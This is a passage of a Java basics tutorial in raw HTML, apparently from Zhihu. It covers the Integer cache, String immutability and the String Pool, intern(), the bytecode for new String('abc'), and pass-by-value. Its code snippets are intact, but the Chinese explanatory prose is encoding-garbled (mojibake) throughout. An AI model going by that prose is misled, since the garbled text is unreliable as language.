class=\"n\">IntegerCache</span><span class=\"o\">.</span><span class=\"na\">low</span><span class=\"o\">)];</span>\n    <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><p>åœ¨ Java 8 ä¸­ï¼ŒInteger ç¼“å­˜æ± çš„å¤§å°é»˜è®¤ä¸º -128\\~127ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">low</span> <span class=\"o\">=</span> <span class=\"o\">-</span><span class=\"n\">128</span><span class=\"o\">;</span>\n<span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">high</span><span class=\"o\">;</span>\n<span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"n\">Integer</span> <span class=\"n\">cache</span><span class=\"o\">[];</span>\n\n<span class=\"kd\">static</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// high value may be configured by property\n</span><span class=\"c1\"></span>    <span class=\"kt\">int</span> <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">127</span><span class=\"o\">;</span>\n    <span class=\"n\">String</span> <span class=\"n\">integerCacheHighPropValue</span> <span class=\"o\">=</span>\n        <span class=\"n\">sun</span><span class=\"o\">.</span><span class=\"na\">misc</span><span class=\"o\">.</span><span class=\"na\">VM</span><span class=\"o\">.</span><span class=\"na\">getSavedProperty</span><span class=\"o\">(</span><span class=\"s\">&#34;java.lang.Integer.IntegerCache.high&#34;</span><span class=\"o\">);</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">integerCacheHighPropValue</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">parseInt</span><span class=\"o\">(</span><span class=\"n\">integerCacheHighPropValue</span><span class=\"o\">);</span>\n            <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">127</span><span class=\"o\">);</span>\n            <span class=\"c1\">// Maximum array size is Integer.MAX_VALUE\n</span><span class=\"c1\"></span>            <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">min</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">MAX_VALUE</span> <span class=\"o\">-</span> <span class=\"o\">(-</span><span class=\"n\">low</span><span class=\"o\">)</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span> <span class=\"k\">catch</span><span class=\"o\">(</span> <span class=\"n\">NumberFormatException</span> <span class=\"n\">nfe</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"c1\">// If the property cannot be parsed into an int, ignore it.\n</span><span class=\"c1\"></span>        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">high</span> <span class=\"o\">=</span> <span class=\"n\">h</span><span class=\"o\">;</span>\n\n    <span class=\"n\">cache</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">[(</span><span class=\"n\">high</span> <span class=\"o\">-</span> <span class=\"n\">low</span><span class=\"o\">)</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n    <span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">low</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">k</span> <span class=\"o\">&lt;</span> <span class=\"n\">cache</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">k</span><span class=\"o\">++)</span>\n        <span class=\"n\">cache</span><span class=\"o\">[</span><span class=\"n\">k</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">j</span><span class=\"o\">++);</span>\n\n    <span class=\"c1\">// range [-128, 127] must be interned (JLS7 5.1.7)\n</span><span class=\"c1\"></span>    <span class=\"k\">assert</span> <span class=\"n\">IntegerCache</span><span class=\"o\">.</span><span class=\"na\">high</span> <span class=\"o\">&gt;=</span> <span class=\"n\">127</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>ç¼–è¯‘å™¨ä¼šåœ¨è‡ªåŠ¨è£…ç®±è¿‡ç¨‹è°ƒç”¨ valueOf() æ–¹æ³•ï¼Œå› æ­¤å¤šä¸ªå€¼ç›¸åŒä¸”å€¼åœ¨ç¼“å­˜æ± èŒƒå›´å†…çš„ Integer å®ä¾‹ä½¿ç”¨è‡ªåŠ¨è£…ç®±æ¥åˆ›å»ºï¼Œé‚£ä¹ˆå°±ä¼šå¼•ç”¨ç›¸åŒçš„å¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Integer</span> <span class=\"n\">m</span> <span class=\"o\">=</span> <span class=\"n\">123</span><span class=\"o\">;</span>\n<span class=\"n\">Integer</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">123</span><span class=\"o\">;</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">m</span> <span class=\"o\">==</span> <span class=\"n\">n</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>åŸºæœ¬ç±»å‹å¯¹åº”çš„ç¼“å†²æ± å¦‚ä¸‹ï¼š</p><ul><li>boolean values true and false</li><li>all byte values</li><li>short values between -128 and 127</li><li>int values between -128 and 127</li><li>char in the range \\u0000 to \\u007F</li></ul><p>åœ¨ä½¿ç”¨è¿™äº›åŸºæœ¬ç±»å‹å¯¹åº”çš„åŒ…è£…ç±»å‹æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ç¼“å†²æ± ä¸­çš„å¯¹è±¡ã€‚</p><p><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/9030817/differences-between-new-integer123-integer-valueof123-and-just-123\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123 </a></p><h2>äºŒã€String</h2><h2>æ¦‚è§ˆ</h2><p>String è¢«å£°æ˜ä¸º finalï¼Œå› æ­¤å®ƒä¸å¯è¢«ç»§æ‰¿ã€‚</p><p>åœ¨ Java 8 ä¸­ï¼ŒString å†…éƒ¨ä½¿ç”¨ char æ•°ç»„å­˜å‚¨æ•°æ®ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">String</span>\n    <span class=\"kd\">implements</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">Serializable</span><span class=\"o\">,</span> <span class=\"n\">Comparable</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;,</span> <span class=\"n\">CharSequence</span> <span class=\"o\">{</span>\n    <span class=\"cm\">/** The value is used for character storage. */</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"kt\">char</span> <span class=\"n\">value</span><span class=\"o\">[];</span>\n<span class=\"o\">}</span></code></pre></div><p>åœ¨ Java 9 ä¹‹åï¼ŒString ç±»çš„å®ç°æ”¹ç”¨ byte æ•°ç»„å­˜å‚¨å­—ç¬¦ä¸²ï¼ŒåŒæ—¶ä½¿ç”¨ <code>coder</code> æ¥æ ‡è¯†ä½¿ç”¨äº†å“ªç§ç¼–ç ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">String</span>\n    <span class=\"kd\">implements</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">Serializable</span><span class=\"o\">,</span> <span class=\"n\">Comparable</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;,</span> <span class=\"n\">CharSequence</span> <span class=\"o\">{</span>\n    <span class=\"cm\">/** The value is used for character storage. */</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"kt\">byte</span><span class=\"o\">[]</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n\n    <span class=\"cm\">/** The identifier of the encoding used to encode the bytes in {@code value}. */</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"kt\">byte</span> <span class=\"n\">coder</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>value æ•°ç»„è¢«å£°æ˜ä¸º finalï¼Œè¿™æ„å‘³ç€ value æ•°ç»„åˆå§‹åŒ–ä¹‹åå°±ä¸èƒ½å†å¼•ç”¨å…¶å®ƒæ•°ç»„ã€‚å¹¶ä¸” String å†…éƒ¨æ²¡æœ‰æ”¹å˜ value æ•°ç»„çš„æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥ä¿è¯ String ä¸å¯å˜ã€‚</p><h2>ä¸å¯å˜çš„å¥½å¤„</h2><p><b>1. å¯ä»¥ç¼“å­˜ hash å€¼</b> </p><p>å› ä¸º String çš„ hash å€¼ç»å¸¸è¢«ä½¿ç”¨ï¼Œä¾‹å¦‚ String ç”¨åš HashMap çš„ keyã€‚ä¸å¯å˜çš„ç‰¹æ€§å¯ä»¥ä½¿å¾— hash å€¼ä¹Ÿä¸å¯å˜ï¼Œå› æ­¤åªéœ€è¦è¿›è¡Œä¸€æ¬¡è®¡ç®—ã€‚</p><p><b>2. String Pool çš„éœ€è¦</b> </p><p>å¦‚æœä¸€ä¸ª String å¯¹è±¡å·²ç»è¢«åˆ›å»ºè¿‡äº†ï¼Œé‚£ä¹ˆå°±ä¼šä» String Pool ä¸­å–å¾—å¼•ç”¨ã€‚åªæœ‰ String æ˜¯ä¸å¯å˜çš„ï¼Œæ‰å¯èƒ½ä½¿ç”¨ String Poolã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-4816d51ab7c22bd2ecfd1c59cd418457_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"637\" data-rawheight=\"428\" class=\"origin_image zh-lightbox-thumb\" width=\"637\" data-original=\"https://pic4.zhimg.com/v2-4816d51ab7c22bd2ecfd1c59cd418457_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;637&#39; height=&#39;428&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"637\" data-rawheight=\"428\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"637\" data-original=\"https://pic4.zhimg.com/v2-4816d51ab7c22bd2ecfd1c59cd418457_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-4816d51ab7c22bd2ecfd1c59cd418457_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p><b>3. å®‰å…¨æ€§</b> </p><p>String ç»å¸¸ä½œä¸ºå‚æ•°ï¼ŒString ä¸å¯å˜æ€§å¯ä»¥ä¿è¯å‚æ•°ä¸å¯å˜ã€‚ä¾‹å¦‚åœ¨ä½œä¸ºç½‘ç»œè¿æ¥å‚æ•°çš„æƒ…å†µä¸‹å¦‚æœ String æ˜¯å¯å˜çš„ï¼Œé‚£ä¹ˆåœ¨ç½‘ç»œè¿æ¥è¿‡ç¨‹ä¸­ï¼ŒString è¢«æ”¹å˜ï¼Œæ”¹å˜ String å¯¹è±¡çš„é‚£ä¸€æ–¹ä»¥ä¸ºç°åœ¨è¿æ¥çš„æ˜¯å…¶å®ƒä¸»æœºï¼Œè€Œå®é™…æƒ…å†µå´ä¸ä¸€å®šæ˜¯ã€‚</p><p><b>4. çº¿ç¨‹å®‰å…¨</b> </p><p>String ä¸å¯å˜æ€§å¤©ç”Ÿå…·å¤‡çº¿ç¨‹å®‰å…¨ï¼Œå¯ä»¥åœ¨å¤šä¸ªçº¿ç¨‹ä¸­å®‰å…¨åœ°ä½¿ç”¨ã€‚</p><p><a href=\"https://link.zhihu.com/?target=https%3A//www.programcreek.com/2013/04/why-string-is-immutable-in-java/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Program Creek : Why String is immutable in Java?</a></p><h2>String, StringBuffer and StringBuilder</h2><p><b>1. å¯å˜æ€§</b> </p><ul><li>String ä¸å¯å˜</li><li>StringBuffer å’Œ StringBuilder å¯å˜</li></ul><p><b>2. çº¿ç¨‹å®‰å…¨</b> </p><ul><li>String ä¸å¯å˜ï¼Œå› æ­¤æ˜¯çº¿ç¨‹å®‰å…¨çš„</li><li>StringBuilder ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„</li><li>StringBuffer æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå†…éƒ¨ä½¿ç”¨ synchronized è¿›è¡ŒåŒæ­¥</li></ul><p><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/2971315/string-stringbuffer-and-stringbuilder\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow : String, StringBuffer, and StringBuilder</a></p><h2>String Pool</h2><p>å­—ç¬¦ä¸²å¸¸é‡æ± ï¼ˆString Poolï¼‰ä¿å­˜ç€æ‰€æœ‰å­—ç¬¦ä¸²å­—é¢é‡ï¼ˆliteral stringsï¼‰ï¼Œè¿™äº›å­—é¢é‡åœ¨ç¼–è¯‘æ—¶æœŸå°±ç¡®å®šã€‚ä¸ä»…å¦‚æ­¤ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ String çš„ intern() æ–¹æ³•åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å°†å­—ç¬¦ä¸²æ·»åŠ åˆ° String Pool ä¸­ã€‚</p><p>å½“ä¸€ä¸ªå­—ç¬¦ä¸²è°ƒç”¨ intern() æ–¹æ³•æ—¶ï¼Œå¦‚æœ String Pool ä¸­å·²ç»å­˜åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²å’Œè¯¥å­—ç¬¦ä¸²å€¼ç›¸ç­‰ï¼ˆä½¿ç”¨ equals() æ–¹æ³•è¿›è¡Œç¡®å®šï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å› String Pool ä¸­å­—ç¬¦ä¸²çš„å¼•ç”¨ï¼›å¦åˆ™ï¼Œå°±ä¼šåœ¨ String Pool ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›è¿™ä¸ªæ–°å­—ç¬¦ä¸²çš„å¼•ç”¨ã€‚</p><p>ä¸‹é¢ç¤ºä¾‹ä¸­ï¼Œs1 å’Œ s2 é‡‡ç”¨ new String() çš„æ–¹å¼æ–°å»ºäº†ä¸¤ä¸ªä¸åŒå­—ç¬¦ä¸²ï¼Œè€Œ s3 å’Œ s4 æ˜¯é€šè¿‡ s1.intern() æ–¹æ³•å–å¾—ä¸€ä¸ªå­—ç¬¦ä¸²å¼•ç”¨ã€‚intern() é¦–å…ˆæŠŠ s1 å¼•ç”¨çš„å­—ç¬¦ä¸²æ”¾åˆ° String Pool ä¸­ï¼Œç„¶åè¿”å›è¿™ä¸ªå­—ç¬¦ä¸²å¼•ç”¨ã€‚å› æ­¤ s3 å’Œ s4 å¼•ç”¨çš„æ˜¯åŒä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">String</span> <span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">(</span><span class=\"s\">&#34;aaa&#34;</span><span class=\"o\">);</span>\n<span class=\"n\">String</span> <span class=\"n\">s2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">(</span><span class=\"s\">&#34;aaa&#34;</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">s1</span> <span class=\"o\">==</span> <span class=\"n\">s2</span><span class=\"o\">);</span>           <span class=\"c1\">// false\n</span><span class=\"c1\"></span><span class=\"n\">String</span> <span class=\"n\">s3</span> <span class=\"o\">=</span> <span class=\"n\">s1</span><span class=\"o\">.</span><span class=\"na\">intern</span><span class=\"o\">();</span>\n<span class=\"n\">String</span> <span class=\"n\">s4</span> <span class=\"o\">=</span> <span class=\"n\">s1</span><span class=\"o\">.</span><span class=\"na\">intern</span><span class=\"o\">();</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">s3</span> <span class=\"o\">==</span> <span class=\"n\">s4</span><span class=\"o\">);</span>           <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>å¦‚æœæ˜¯é‡‡ç”¨ &#34;bbb&#34; è¿™ç§å­—é¢é‡çš„å½¢å¼åˆ›å»ºå­—ç¬¦ä¸²ï¼Œä¼šè‡ªåŠ¨åœ°å°†å­—ç¬¦ä¸²æ”¾å…¥ String Pool ä¸­ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">String</span> <span class=\"n\">s5</span> <span class=\"o\">=</span> <span class=\"s\">&#34;bbb&#34;</span><span class=\"o\">;</span>\n<span class=\"n\">String</span> <span class=\"n\">s6</span> <span class=\"o\">=</span> <span class=\"s\">&#34;bbb&#34;</span><span class=\"o\">;</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">s5</span> <span class=\"o\">==</span> <span class=\"n\">s6</span><span class=\"o\">);</span>  <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>åœ¨ Java 7 ä¹‹å‰ï¼ŒString Pool è¢«æ”¾åœ¨è¿è¡Œæ—¶å¸¸é‡æ± ä¸­ï¼Œå®ƒå±äºæ°¸ä¹…ä»£ã€‚è€Œåœ¨ Java 7ï¼ŒString Pool è¢«ç§»åˆ°å †ä¸­ã€‚è¿™æ˜¯å› ä¸ºæ°¸ä¹…ä»£çš„ç©ºé—´æœ‰é™ï¼Œåœ¨å¤§é‡ä½¿ç”¨å­—ç¬¦ä¸²çš„åœºæ™¯ä¸‹ä¼šå¯¼è‡´ OutOfMemoryError é”™è¯¯ã€‚</p><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/10578984/what-is-string-interning\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow : What is String interning?</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//tech.meituan.com/in_depth_understanding_string_intern.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ·±å…¥è§£æ String#intern</a></li></ul><h2>new String(&#34;abc&#34;)</h2><p>ä½¿ç”¨è¿™ç§æ–¹å¼ä¸€å…±ä¼šåˆ›å»ºä¸¤ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼ˆå‰ææ˜¯ String Pool ä¸­è¿˜æ²¡æœ‰ &#34;abc&#34; å­—ç¬¦ä¸²å¯¹è±¡ï¼‰ã€‚</p><ul><li>&#34;abc&#34; å±äºå­—ç¬¦ä¸²å­—é¢é‡ï¼Œå› æ­¤ç¼–è¯‘æ—¶æœŸä¼šåœ¨ String Pool ä¸­åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼ŒæŒ‡å‘è¿™ä¸ª &#34;abc&#34; å­—ç¬¦ä¸²å­—é¢é‡ï¼›</li><li>è€Œä½¿ç”¨ new çš„æ–¹å¼ä¼šåœ¨å †ä¸­åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ã€‚</li></ul><p>åˆ›å»ºä¸€ä¸ªæµ‹è¯•ç±»ï¼Œå…¶ main æ–¹æ³•ä¸­ä½¿ç”¨è¿™ç§æ–¹å¼æ¥åˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">NewStringTest</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">String</span> <span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">(</span><span class=\"s\">&#34;abc&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>ä½¿ç”¨ javap -verbose è¿›è¡Œåç¼–è¯‘ï¼Œå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"c1\">// ...\n</span><span class=\"c1\"></span><span class=\"n\">Constant</span> <span class=\"nl\">pool:</span>\n<span class=\"c1\">// ...\n</span><span class=\"c1\"></span>   <span class=\"err\">#</span><span class=\"n\">2</span> <span class=\"o\">=</span> <span class=\"n\">Class</span>              <span class=\"err\">#</span><span class=\"n\">18</span>            <span class=\"c1\">// java/lang/String\n</span><span class=\"c1\"></span>   <span class=\"err\">#</span><span class=\"n\">3</span> <span class=\"o\">=</span> <span class=\"n\">String</span>             <span class=\"err\">#</span><span class=\"n\">19</span>            <span class=\"c1\">// abc\n</span><span class=\"c1\">// ...\n</span><span class=\"c1\"></span>  <span class=\"err\">#</span><span class=\"n\">18</span> <span class=\"o\">=</span> <span class=\"n\">Utf8</span>               <span class=\"n\">java</span><span class=\"o\">/</span><span class=\"n\">lang</span><span class=\"o\">/</span><span class=\"n\">String</span>\n  <span class=\"err\">#</span><span class=\"n\">19</span> <span class=\"o\">=</span> <span class=\"n\">Utf8</span>               <span class=\"n\">abc</span>\n<span class=\"c1\">// ...\n</span><span class=\"c1\"></span>\n  <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">String</span><span class=\"o\">[]);</span><span class=\"nl\">\n</span><span class=\"nl\">    descriptor:</span> <span class=\"o\">([</span><span class=\"n\">Ljava</span><span class=\"o\">/</span><span class=\"n\">lang</span><span class=\"o\">/</span><span class=\"n\">String</span><span class=\"o\">;)</span><span class=\"n\">V</span><span class=\"nl\">\n</span><span class=\"nl\">    flags:</span> <span class=\"n\">ACC_PUBLIC</span><span class=\"o\">,</span> <span class=\"n\">ACC_STATIC</span><span class=\"nl\">\n</span><span class=\"nl\">    Code:</span>\n      <span class=\"n\">stack</span><span class=\"o\">=</span><span class=\"n\">3</span><span class=\"o\">,</span> <span class=\"n\">locals</span><span class=\"o\">=</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">args_size</span><span class=\"o\">=</span><span class=\"n\">1</span><span class=\"nl\">\n</span><span class=\"nl\">         0:</span> <span class=\"k\">new</span>           <span class=\"err\">#</span><span class=\"n\">2</span>                  <span class=\"c1\">// class java/lang/String\n</span><span class=\"c1\"></span>         <span class=\"nl\">3:</span> <span class=\"n\">dup</span><span class=\"nl\">\n</span><span class=\"nl\">         4:</span> <span class=\"n\">ldc</span>           <span class=\"err\">#</span><span class=\"n\">3</span>                  <span class=\"c1\">// String abc\n</span><span class=\"c1\"></span>         <span class=\"nl\">6:</span> <span class=\"n\">invokespecial</span> <span class=\"err\">#</span><span class=\"n\">4</span>                  <span class=\"c1\">// Method java/lang/String.&#34;&lt;init&gt;&#34;:(Ljava/lang/String;)V\n</span><span class=\"c1\"></span>         <span class=\"nl\">9:</span> <span class=\"n\">astore_1</span>\n<span class=\"o\">//</span> <span class=\"o\">...</span></code></pre></div><p>åœ¨ Constant Pool ä¸­ï¼Œ#19 å­˜å‚¨è¿™å­—ç¬¦ä¸²å­—é¢é‡ &#34;abc&#34;ï¼Œ#3 æ˜¯ String Pool çš„å­—ç¬¦ä¸²å¯¹è±¡ï¼Œå®ƒæŒ‡å‘ #19 è¿™ä¸ªå­—ç¬¦ä¸²å­—é¢é‡ã€‚åœ¨ main æ–¹æ³•ä¸­ï¼Œ0: è¡Œä½¿ç”¨ new #2 åœ¨å †ä¸­åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œå¹¶ä¸”ä½¿ç”¨ ldc #3 å°† String Pool ä¸­çš„å­—ç¬¦ä¸²å¯¹è±¡ä½œä¸º String æ„é€ å‡½æ•°çš„å‚æ•°ã€‚</p><p>ä»¥ä¸‹æ˜¯ String æ„é€ å‡½æ•°çš„æºç ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œåœ¨å°†ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ä½œä¸ºå¦ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡çš„æ„é€ å‡½æ•°å‚æ•°æ—¶ï¼Œå¹¶ä¸ä¼šå®Œå…¨å¤åˆ¶ value æ•°ç»„å†…å®¹ï¼Œè€Œæ˜¯éƒ½ä¼šæŒ‡å‘åŒä¸€ä¸ª value æ•°ç»„ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"nf\">String</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">original</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">value</span> <span class=\"o\">=</span> <span class=\"n\">original</span><span class=\"o\">.</span><span class=\"na\">value</span><span class=\"o\">;</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">hash</span> <span class=\"o\">=</span> <span class=\"n\">original</span><span class=\"o\">.</span><span class=\"na\">hash</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>ä¸‰ã€è¿ç®—</h2><h2>å‚æ•°ä¼ é€’</h2><p>Java çš„å‚æ•°æ˜¯ä»¥å€¼ä¼ é€’çš„å½¢å¼ä¼ å…¥æ–¹æ³•ä¸­ï¼Œè€Œä¸æ˜¯å¼•ç”¨ä¼ é€’ã€‚</p><p>ä»¥ä¸‹ä»£ç ä¸­ Dog dog çš„ dog æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå­˜å‚¨çš„æ˜¯å¯¹è±¡çš„åœ°å€ã€‚åœ¨å°†ä¸€ä¸ªå‚æ•°ä¼ å…¥ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œæœ¬è´¨ä¸Šæ˜¯å°†å¯¹è±¡çš„åœ°å€ä»¥å€¼çš„æ–¹å¼ä¼ é€’åˆ°å½¢å‚ä¸­ã€‚å› æ­¤åœ¨æ–¹æ³•ä¸­ä½¿æŒ‡é’ˆå¼•ç”¨å…¶å®ƒå¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæŒ‡é’ˆæ­¤æ—¶æŒ‡å‘çš„æ˜¯å®Œå…¨ä¸åŒçš„å¯¹è±¡ï¼Œåœ¨ä¸€æ–¹æ”¹å˜å…¶æ‰€æŒ‡å‘å¯¹è±¡çš„å†…å®¹æ—¶å¯¹å¦ä¸€æ–¹æ²¡æœ‰å½±å“ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Dog</span> <span class=\"o\">{</span>\n\n    <span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">;</span>\n\n    <span class=\"n\">Dog</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">name</span> <span class=\"o\">=</span> <span class=\"n\">name</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"n\">String</span> <span class=\"nf\">getName</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">name</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kt\">void</span> <span class=\"nf\">setName</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">name</span> <span class=\"o\">=</span> <span class=\"n\">name</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"n\">String</span> <span class=\"nf\">getObjectAddress</span><span 